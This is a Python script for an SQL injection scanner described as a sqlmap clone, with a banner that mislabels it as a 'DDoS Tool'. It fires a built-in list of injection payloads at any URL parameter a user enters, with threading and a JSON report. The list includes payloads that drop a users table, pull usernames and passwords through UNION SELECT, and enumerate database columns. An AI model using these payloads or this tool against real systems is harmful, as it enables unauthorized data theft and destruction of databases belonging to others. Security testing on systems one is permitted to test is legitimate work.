import requests
import logging
import time
from termcolor import colored, cprint
from threading import Thread
from queue import Queue
import json

logging.basicConfig(
    filename="sqlmap_clone_advanced.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def log_message(message, level="info"):
    if level == "info":
        logging.info(message)
    elif level == "error":
        logging.error(message)
    elif level == "warning":
        logging.warning(message)
    print(message)

class SQLInjectionScanner:
    def __init__(self, url, param, payloads, timeout=10, threads=5):
        self.url = url
        self.param = param
        self.payloads = payloads
        self.timeout = timeout
        self.threads = threads
        self.queue = Queue()
        self.vulnerabilities = []

    def test_payload(self, payload):
        injection_url = f"{self.url}?{self.param}={payload}"
        cprint(f"Testing payload: {payload}", "yellow")
        try:
            response = requests.get(injection_url, timeout=self.timeout)
            if any(error in response.text.lower() for error in ["sql", "mysql", "syntax", "error", "database"]):
                cprint(f"[!] Vulnerability found with payload: {payload}", "green")
                cprint(f"[!] Vulnerable URL: {injection_url}", "cyan")
                self.vulnerabilities.append({
                    "payload": payload,
                    "url": injection_url,
                    "response": response.text[:500]
                })
                return True
        except requests.exceptions.RequestException as e:
            cprint(f"[!] Error testing payload '{payload}': {e}", "red")
        return False

    def worker(self):
        while not self.queue.empty():
            payload = self.queue.get()
            if self.test_payload(payload):
                while not self.queue.empty():
                    self.queue.get()
                break
            self.queue.task_done()

    def run_scan(self):
        cprint(f"Starting scan on {self.url} with parameter '{self.param}'...", "blue")
        for payload in self.payloads:
            self.queue.put(payload)

        threads = []
        for _ in range(self.threads):
            thread = Thread(target=self.worker)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        if self.vulnerabilities:
            cprint("[!] SQL Injection vulnerabilities detected! Stopping the test.", "red")
            cprint(f"[!] Found {len(self.vulnerabilities)} vulnerabilities.", "cyan")
        else:
            cprint("[-] No vulnerabilities found.", "green")

    def generate_report(self):
        if not self.vulnerabilities:
            return
        
        report_data = {
            "url": self.url,
            "param": self.param,
            "vulnerabilities": self.vulnerabilities
        }

        with open("vulnerabilities_report.json", "w") as report_file:
            json.dump(report_data, report_file, indent=4)

        cprint(f"[+] Report generated: vulnerabilities_report.json", "green")
        
        cprint("[+] Vulnerabilities found:", "cyan")
        for vuln in self.vulnerabilities:
            cprint(f"Payload: {vuln['payload']}", "yellow")
            cprint(f"URL: {vuln['url']}", "cyan")
            cprint(f"Response snippet: {vuln['response'][:200]}", "white")

if __name__ == "__main__":
    print(colored("=====================================", 'cyan'))
    print(colored("[×] DDoS Tool by 𝘾𝙞𝙥𝙝𝙚𝙧 𝙎𝙦𝙪𝙞𝙙", 'red'))
    print(colored("[×] Use responsibly!", 'yellow'))
    print(colored("=====================================", 'cyan'))

    url = input(colored("Enter the target URL (e.g., http://example.com/search): ", "blue"))
    param = input(colored("Enter the target parameter (e.g., query): ", "blue"))

    cprint("Do you want to load a custom wordlist? (yes/no)", "blue")
    use_wordlist = input(colored("> ", "yellow")).strip().lower()

    if use_wordlist == "yes":
        wordlist_path = input(colored("Enter the path to the wordlist file: ", "blue"))
        try:
            with open(wordlist_path, "r") as file:
                payloads = [line.strip() for line in file.readlines()]
            cprint(f"[+] Loaded {len(payloads)} payloads from {wordlist_path}.", "green")
        except FileNotFoundError:
            cprint("[!] Wordlist file not found. Exiting.", "red")
            exit()
    else:
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null, null--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users;--",
            "' OR 'a'='a",
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT table_name, column_name FROM information_schema.columns--",
        ]

    cprint("How many threads do you want to use? (default: 5)", "blue")
    try:
        threads = int(input(colored("> ", "yellow")).strip())
    except ValueError:
        threads = 5

    scanner = SQLInjectionScanner(url, param, payloads, threads=threads)
    scanner.run_scan()
    scanner.generate_report()
